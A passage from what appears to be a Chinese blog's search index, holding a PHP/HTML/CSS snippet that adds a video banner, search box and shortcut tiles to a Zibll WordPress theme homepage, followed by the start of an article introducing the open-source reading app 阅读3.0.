class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">add_action(&#x27;wp_head&#x27;, &#x27;zibll_Add_ons_newindex&#x27;);</span><br><span class="line">function zibll_Add_ons_newindex() &#123;</span><br><span class="line">    if(is_home())&#123;</span><br><span class="line">    ?&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!--新首页开始--&gt;</span><br><span class="line">  &lt;div id=&quot;page-wrapper&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;home-banner por&quot;&gt;</span><br><span class="line">        &lt;section class=&quot;section&quot; style=&quot;height: calc(100vh - 220px);max-height: 600px;&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;video-wrapper&quot;&gt;</span><br><span class="line">                    &lt;video autoplay=&quot;&quot; playsinline=&quot;&quot; loop=&quot;&quot; muted=&quot;&quot; src=&quot;视频链接&quot;&gt;</span><br><span class="line">                    &lt;/video&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;video-overlay&quot;&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/section&gt;</span><br><span class="line">            &lt;div class=&quot;wrapper  poa&quot; style=&quot;top: 20%;&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;home-banner-content Onecad_clearfix&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;slogan-text por fl&quot;&gt;</span><br><span class="line">                    &lt;p&gt;&lt;?php echo get_bloginfo(&#x27;name&#x27;); ?&gt;&lt;i class=&quot;iblock poa corner&quot; style=&quot;background:url(//www.ytshopcn.com/img/hot.svg) no-repeat;&quot;&gt;&lt;/i&gt;&lt;/p&gt;</span><br><span class="line">                    &lt;p class=&quot;promote-sub-title line-one&quot;&gt;已发布&lt;span style=&quot;display: inline-block;overflow: hidden;line-height: 34px;vertical-align: -9px;&quot;&gt;</span><br><span class="line">              &lt;em id=&quot;goal-works&quot; value=&quot;5351266&quot; style=&quot;font-style: normal;&quot;&gt;</span><br><span class="line">                &lt;ps style=&quot;color: #26d6c8;&quot;&gt;&lt;?php $count_posts = wp_count_posts(); echo $published_posts =$count_posts-&gt;publish;?&gt;&lt;/ps&gt;</span><br><span class="line">              &lt;/em&gt;</span><br><span class="line">            &lt;/span&gt;篇文章内容&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;home-banner-search por searchv2-top-m&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;primary-menus&quot; style=&quot; position: unset;transform: translate(1px, 1px);&quot;&gt;</span><br><span class="line">                                        &lt;div class=&quot;cont&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;left-cont&quot;&gt;</span><br><span class="line">                            &lt;form class=&quot;search&quot; id=&quot;search_4&quot; action=&quot;/?s=&quot; method=&quot;get&quot; target=&quot;_blank&quot;&gt;</span><br><span class="line">                                &lt;input type=&quot;text&quot; name=&quot;s&quot; class=&quot;s&quot; placeholder=&quot;输入关键词 按回车搜索&quot;&gt;</span><br><span class="line">                                &lt;button type=&quot;submit&quot; name=&quot;&quot; class=&quot;btn&quot;&gt;</span><br><span class="line">                                    站内搜索</span><br><span class="line">                                &lt;/button&gt;</span><br><span class="line">                            &lt;/form&gt;</span><br><span class="line">                            &lt;div class=&quot;tag&quot;&gt;&lt;a href=&quot;/?s=教程&quot; target=&quot;_blank&quot;&gt;教程&lt;/a&gt;&lt;a href=&quot;/?s=美化 &quot; target=&quot;_blank&quot;&gt;美化&lt;/a&gt;&lt;a href=&quot;/?s=电影&quot; target=&quot;_blank&quot;&gt;电影&lt;/a&gt;&lt;/div&gt; </span><br><span class="line">                            </span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">                &lt;!-- 头部快速链接导航 --&gt;</span><br><span class="line">         </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;home-row-qukuai&quot; class=&quot;  home_row home_row_1  module-qukuai  &quot; style=&quot;background-color:;&quot;&gt; </span><br><span class="line">   &lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;home-row-left content-area &quot;&gt; </span><br><span class="line">            &lt;div class=&quot;sort jitheme_radius&quot; style=&quot;margin-top:-80px ;&quot;&gt;    </span><br><span class="line">                &lt;ul class=&quot;sort-config&quot;&gt; </span><br><span class="line">                    &lt;li&gt;</span><br><span class="line">                                            &lt;div class=&quot;sort-config-item&quot;&gt;</span><br><span class="line">                                            &lt;img class=&quot;sort-config-icon&quot; src=&quot;//www.ytshopcn.com/img/提示.svg&quot; &gt;</span><br><span class="line">                                            &lt;a href=&quot;&quot; target=&quot;_blank&quot;&gt;&lt;p class=&quot;sort-config-title&quot;&gt;自定义</span><br><span class="line">                                            </span><br><span class="line">                                            &lt;/p&gt; &lt;/a&gt;</span><br><span class="line">                                            &lt;span class=&quot;sort-config-desc&quot;&gt;自定义八个字左右&lt;/span&gt;</span><br><span class="line">                                            &lt;/div&gt;&lt;/li&gt; &lt;li&gt;</span><br><span class="line">                                            &lt;div class=&quot;sort-config-item&quot;&gt;</span><br><span class="line">                                            &lt;img class=&quot;sort-config-icon&quot; src=&quot;//www.ytshopcn.com/img/文章.svg&quot; &gt;</span><br><span class="line">                                            &lt;a href=&quot;&quot; target=&quot;_blank&quot;&gt;&lt;p class=&quot;sort-config-title&quot;&gt;自定义</span><br><span class="line">                                            </span><br><span class="line">                                            &lt;/p&gt; &lt;/a&gt;</span><br><span class="line">                                            &lt;span class=&quot;sort-config-desc&quot;&gt;自定义八个字左右&lt;/span&gt;</span><br><span class="line">                                            &lt;/div&gt;&lt;/li&gt; &lt;li&gt;</span><br><span class="line">                                            &lt;div class=&quot;sort-config-item&quot;&gt;</span><br><span class="line">                                            &lt;img class=&quot;sort-config-icon&quot; src=&quot;//www.ytshopcn.com/img/图片.svg&quot; &gt;</span><br><span class="line">                                            &lt;a href=&quot;&quot; target=&quot;_blank&quot;&gt;&lt;p class=&quot;sort-config-title&quot;&gt;自定义</span><br><span class="line">                                            </span><br><span class="line">                                            &lt;/p&gt; &lt;/a&gt;</span><br><span class="line">                                            &lt;span class=&quot;sort-config-desc&quot;&gt;自定义八个字左右&lt;/span&gt;</span><br><span class="line">                                            &lt;/div&gt;&lt;/li&gt; &lt;li&gt;</span><br><span class="line">                                            &lt;div class=&quot;sort-config-item&quot;&gt;</span><br><span class="line">                                            &lt;img class=&quot;sort-config-icon&quot; src=&quot;//www.ytshopcn.com/img/安全.svg&quot; &gt;</span><br><span class="line">                                            &lt;a href=&quot;&quot; target=&quot;_blank&quot;&gt;&lt;p class=&quot;sort-config-title&quot;&gt;自定义</span><br><span class="line">                                            </span><br><span class="line">                                            &lt;/p&gt; &lt;/a&gt;</span><br><span class="line">                                            &lt;span class=&quot;sort-config-desc&quot;&gt;自定义八个字左右&lt;/span&gt;</span><br><span class="line">                                            &lt;/div&gt;&lt;/li&gt; &lt;li&gt;</span><br><span class="line">                                            &lt;div class=&quot;sort-config-item&quot;&gt;</span><br><span class="line">                                            &lt;img class=&quot;sort-config-icon&quot; src=&quot;//www.ytshopcn.com/img/注意.svg&quot; &gt;</span><br><span class="line">                                            &lt;a href=&quot;&quot; target=&quot;_blank&quot;&gt;&lt;p class=&quot;sort-config-title&quot;&gt;自定义</span><br><span class="line">                                            </span><br><span class="line">                                            &lt;/p&gt; &lt;/a&gt;</span><br><span class="line">                                            &lt;span class=&quot;sort-config-desc&quot;&gt;自定义八个字左右&lt;/span&gt;</span><br><span class="line">                                            &lt;/div&gt;&lt;/li&gt;                 &lt;/ul&gt; </span><br><span class="line">                                        &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  #page-wrapper &#123;</span><br><span class="line">  padding-bottom:16px;</span><br><span class="line">    margin-top:-16px;</span><br><span class="line">&#125;</span><br><span class="line">.left-cont a, .sort-config span,.wrapper p,.sort jitheme_radius ul,.sort jitheme_radius li &#123;</span><br><span class="line">    border: 0;</span><br><span class="line">    font-family: inherit;</span><br><span class="line">    /*font-size: 100%;*/</span><br><span class="line">    font-style: inherit;</span><br><span class="line">    font-weight: inherit;</span><br><span class="line">    margin: 0;</span><br><span class="line">    outline: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    vertical-align: baseline;</span><br><span class="line">    word-wrap: break-word;</span><br><span class="line">    box-sizing: border-box;</span><br><span class="line">&#125;</span><br><span class="line">.por &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">    /* z-index: 1; */</span><br><span class="line">    background-position: 0 100%;</span><br><span class="line">    animation: gradient 12s ease-in-out infinite;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner .section &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">    width: 100%;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    /* max-height: 600px; */</span><br><span class="line">    /* height: calc(100vh - 220px); */</span><br><span class="line">&#125;</span><br><span class="line">.home-banner .section .video-wrapper &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: center;</span><br><span class="line">    align-items: center;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    position: absolute;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    z-index: 0;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner .section .video-wrapper video &#123;</span><br><span class="line">    visibility: visible;</span><br><span class="line">    pointer-events: none;</span><br><span class="line">    position: absolute;</span><br><span class="line">    top: 50%;</span><br><span class="line">    left: 50%;</span><br><span class="line">    transform: translate(-50%,-50%);</span><br><span class="line">    height: 100%;</span><br><span class="line">    width: 100%;</span><br><span class="line">    object-fit: cover;</span><br><span class="line">&#125;</span><br><span class="line">canvas, img, video &#123;</span><br><span class="line">    max-width: 100%;</span><br><span class="line">    height: auto;</span><br><span class="line">    box-sizing: border-box;</span><br><span class="line">&#125;</span><br><span class="line">audio, canvas, iframe, img, svg, video &#123;</span><br><span class="line">    vertical-align: middle;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner .section .video-overlay &#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">    width: 100%;</span><br><span class="line">    top: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">    position: absolute;</span><br><span class="line">    background: rgba(45,47,54,.15);</span><br><span class="line">&#125;</span><br><span class="line">.poa &#123;</span><br><span class="line">    color: #fff;</span><br><span class="line">&#125;</span><br><span class="line">.slogan-text.por.fl &#123;</span><br><span class="line">    /* margin-left: 200px; */</span><br><span class="line">    text-align: center;</span><br><span class="line">    width: 100%;</span><br><span class="line">    margin-bottom: 50px;</span><br><span class="line">&#125;</span><br><span class="line">.fl &#123;</span><br><span class="line">    float: left;</span><br><span class="line">&#125;</span><br><span class="line">.por &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner-content .slogan-text p:nth-of-type(1) &#123;</span><br><span class="line">    font-weight: 600;</span><br><span class="line">    font-size: 28px;</span><br><span class="line">    line-height: 46px;</span><br><span class="line">    letter-spacing: 6px;</span><br><span class="line">    text-shadow: 0 2px 4px rgb(0 0 0 / 25%);</span><br><span class="line">    margin-bottom: 20px;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner .corner &#123;</span><br><span class="line">    width: 28px;</span><br><span class="line">    height: 21px;</span><br><span class="line">    position: absolute;</span><br><span class="line">    border-radius: 4px;</span><br><span class="line">    margin: 0px;</span><br><span class="line">    /* left: 340px; */</span><br><span class="line">    /* top: 10px; */</span><br><span class="line">&#125;</span><br><span class="line">.home-banner-content .slogan-text p &#123;</span><br><span class="line">    font-size: 18px;</span><br><span class="line">    line-height: 24px;</span><br><span class="line">    letter-spacing: 2px;</span><br><span class="line">    font-weight: 600;</span><br><span class="line">    text-shadow: 0 2px 4px rgb(0 0 0 / 25%);</span><br><span class="line">&#125;</span><br><span class="line">.Onecad_clearfix:after &#123;</span><br><span class="line">    content: &#x27;&#x27;;</span><br><span class="line">    clear: both;</span><br><span class="line">    display: block;</span><br><span class="line">    height: 0;</span><br><span class="line">    visibility: hidden;</span><br><span class="line">    font-size: 0;</span><br><span class="line">    line-height: 0;</span><br><span class="line">&#125;</span><br><span class="line">.home_row &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">    margin-bottom: 24px /* border-bottom:1px dashed rgba(255, 255, 255, 0.3); */;</span><br><span class="line">&#125;</span><br><span class="line">.home_row &gt; div &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">    max-width: 100%;</span><br><span class="line">    position: relative;</span><br><span class="line">    margin-top: 16px;</span><br><span class="line">&#125;</span><br><span class="line">.wrapper &#123;</span><br><span class="line">    /*width: 1300px;*/</span><br><span class="line">    width: 1170px;</span><br><span class="line">&#125;</span><br><span class="line">.poa &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    width: calc(100% - 200px);</span><br><span class="line">    margin: 0 100px;</span><br><span class="line">&#125;</span><br><span class="line">.home-row-left.content-area &#123;</span><br><span class="line">    max-width: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.b2-content .content-area, .post-style-2 .content-area, .archive .content-area &#123;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">&#125;</span><br><span class="line">.content-area &#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    max-width: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.sort, .jitheme_slide_jb, .jitheme_radius &#123;</span><br><span class="line">    border-radius: 10px;</span><br><span class="line">&#125;</span><br><span class="line">.sort &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">    z-index: 3;</span><br><span class="line">    padding: 26px;</span><br><span class="line">    background: rgba(255,255,255,0.1);</span><br><span class="line">    /* border: 1px solid #797c80; */</span><br><span class="line">    /* -webkit-box-shadow: 0 40px 75px 0 rgb(57 60 67 / 8%); */</span><br><span class="line">    /* box-shadow: 0 40px 75px 0 rgb(57 60 67 / 8%); */</span><br><span class="line">    -webkit-backdrop-filter: blur(10px);</span><br><span class="line">    backdrop-filter: blur(10px);</span><br><span class="line">&#125;</span><br><span class="line">.sort-config &#123;</span><br><span class="line">    display: -webkit-box;</span><br><span class="line">    display: -ms-flexbox;</span><br><span class="line">    display: flex;</span><br><span class="line">    -webkit-box-pack: justify;</span><br><span class="line">    -ms-flex-pack: justify;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">&#125;</span><br><span class="line">.jitheme-pages-vip ol, ul, li &#123;</span><br><span class="line">    list-style: none;</span><br><span class="line">&#125;</span><br><span class="line">.sort-config&gt;li &#123;</span><br><span class="line">    -webkit-box-flex: 1;</span><br><span class="line">    -ms-flex: 1;</span><br><span class="line">    flex: 1;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    height: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.sort-config-item &#123;</span><br><span class="line">    display: block;</span><br><span class="line">    height: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.sort-config-item img &#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 62px;</span><br><span class="line">    height: 62px;</span><br><span class="line">    margin-right: 12px;</span><br><span class="line">&#125;</span><br><span class="line">a, a:active, a:visited &#123;</span><br><span class="line">    text-decoration: none;</span><br><span class="line">    transition: all .2s;</span><br><span class="line">&#125;</span><br><span class="line">.sort-config-title &#123;</span><br><span class="line">    line-height: 34px;</span><br><span class="line">    font-size: 18px;</span><br><span class="line">    font-weight: 600;</span><br><span class="line">    color: var(--main-color);</span><br><span class="line">    -webkit-transition: .3s;</span><br><span class="line">    transition: .3s;</span><br><span class="line">&#125;</span><br><span class="line">.sort-config-desc &#123;</span><br><span class="line">    float: left;</span><br><span class="line">    line-height: 22px;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    color: #8e8e8e;</span><br><span class="line">&#125;</span><br><span class="line">.hidden &#123;</span><br><span class="line">    display: none !important;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner-search &#123;</span><br><span class="line">    width: 50%;</span><br><span class="line">    /* margin-left: 209px; */</span><br><span class="line">    height: auto;</span><br><span class="line">    margin: auto;</span><br><span class="line">&#125;</span><br><span class="line">.left-cont &#123;</span><br><span class="line">    border: 5px solid rgb(255 255 255 / 18%);</span><br><span class="line">    border-radius: 30px;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner-search form&gt;input &#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 50px;</span><br><span class="line">    background: #fff;</span><br><span class="line">    border: none;</span><br><span class="line">    padding: 18px 22px;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    color: #333;</span><br><span class="line">    border-radius: 30px;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner-search input, textarea &#123;</span><br><span class="line">    border-radius: 0px;</span><br><span class="line">&#125;</span><br><span class="line">button, input[class=&quot;s&quot;] &#123;</span><br><span class="line">    -webkit-appearance: none;</span><br><span class="line">    outline: none;</span><br><span class="line">    -webkit-tap-highlight-color: rgba(0,0,0,0);</span><br><span class="line">    font-family: -apple-system,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Microsoft YaHei,Source Han Sans SC,Noto Sans CJK SC,WenQuanYi Micro Hei,sans-serif;</span><br><span class="line">    border: 1px solid #ccc;</span><br><span class="line">    box-sizing: border-box;</span><br><span class="line">&#125;</span><br><span class="line">.primary-menus .left-cont button &#123;</span><br><span class="line">    height: 50px;</span><br><span class="line">    box-sizing: border-box;</span><br><span class="line">    min-width: 100px;</span><br><span class="line">    /* margin-left: 0px; */</span><br><span class="line">    cursor: pointer;</span><br><span class="line">    color: #fff;</span><br><span class="line">    font-size: 15px;</span><br><span class="line">    line-height: 40px;</span><br><span class="line">    position: absolute;</span><br><span class="line">    right: 5px;</span><br><span class="line">    top: 5px;</span><br><span class="line">    border-radius: 1px 30px 30px 1px;</span><br><span class="line">    padding: 0 15px;</span><br><span class="line">    transform: translateY(0px);</span><br><span class="line">&#125;</span><br><span class="line">.button, button &#123;</span><br><span class="line">    background: #fc3c2d;</span><br><span class="line">    border: 1px solid #fc3c2d;</span><br><span class="line">    border-radius: 0px;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner-search .tag &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    right: 100px;</span><br><span class="line">    top: 0;</span><br><span class="line">    padding: 15px 10px;</span><br><span class="line">    display: none;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner-search .tag a &#123;</span><br><span class="line">    display: inline;</span><br><span class="line">    padding: 0px 8px;</span><br><span class="line">    border-radius: 10px;</span><br><span class="line">    background: #EFEFEF;</span><br><span class="line">    float: left;</span><br><span class="line">    margin: 5px;</span><br><span class="line">    height: 20px;</span><br><span class="line">    line-height: 20px;</span><br><span class="line">    color: #A0A0A0;</span><br><span class="line">    font-size: 12px;</span><br><span class="line">&#125;</span><br><span class="line">.home-banner-search .tag a:hover &#123;</span><br><span class="line">    background: #fc3c2d;</span><br><span class="line">    color: #fff;</span><br><span class="line">&#125;</span><br><span class="line">@media (max-width:776px) &#123;#page-wrapper &#123;display: none;&#125;</span><br><span class="line">#home-row-qukuai &#123;display: none;&#125;</span><br><span class="line">&#125;</span><br><span class="line">@media (min-width: 1440px)&#123;</span><br><span class="line">    .home-banner-search .tag&#123;display:block&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 子比主题 </tag>
            
            <tag> 子比美化 </tag>
            
            <tag> 搜索 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阅读 3.0 ：一款开源的聚合阅读软件</title>
      <link href="/1eedcefe.html"/>
      <url>/1eedcefe.html</url>
      
        <content type="html"><![CDATA[<p>相信大家平时多少会有看书的需求，一款好的阅读软件可以带来愉快的阅读体验，而糟糕的阅读软件则不乏弹窗广告以及臃肿无用的功能，用着属实心累。</p><p>今天和大家安利的是一款开源的阅读软件：阅读3.0，该软件无广告，没有花里胡哨的功能，并且一直保持更新优化。在这篇文章中，我将介绍 阅读3.0 的基本用法。</p><h2 id="开源阅读到底是什么"><a href="#开源阅读到底是什么" class="headerlink" title="开源阅读到底是什么"></a>开源阅读到底是什么</h2><p>官网：<a href="https://gedoor.github.io/intro">开源阅读 (gedoor.github.io)</a></p><p>实际上开源阅读（简称阅读）的本质就是一款浏览器，只是它需要通过一些特定规则来对不同的网页进行定义，才能进行浏览。</p><p>换句话说，阅读就是一个把您想看的网页内容进行重新编排的工具。</p><p>所以，我们用阅读看小说，是因为有大佬将网络上已有的小说网站用代码进行了重新定义（也就是我们一直说的书源），从而能通过阅读这个浏览器来进行阅读。</p><p>简而言之，阅读就是个工具，并不提供任何小说内容。</p><p>也正因为如此，阅读还可以听音乐、看漫画甚至是看资讯新闻，只要有大佬愿意去做。</p><h2 id="阅读的宗旨"><a href="#阅读的宗旨" class="headerlink" title="阅读的宗旨"></a>阅读的宗旨</h2><p>不立牌坊，一开始就是为了能够获得清爽简单无广告的阅读体验去的，所以这个宗旨绝对不会变。在能够维持我们的日常运营的情况下，绝对不会有多余的东西出现。</p><h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p>点击 <a href="https://gedoor.github.io/download">这里</a> 跳转进行下载</p><h2 id="主要功能​"><a href="#主要功能​" class="headerlink" title="主要功能​"></a>主要功能<a href="https://gedoor.github.io/intro#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD" 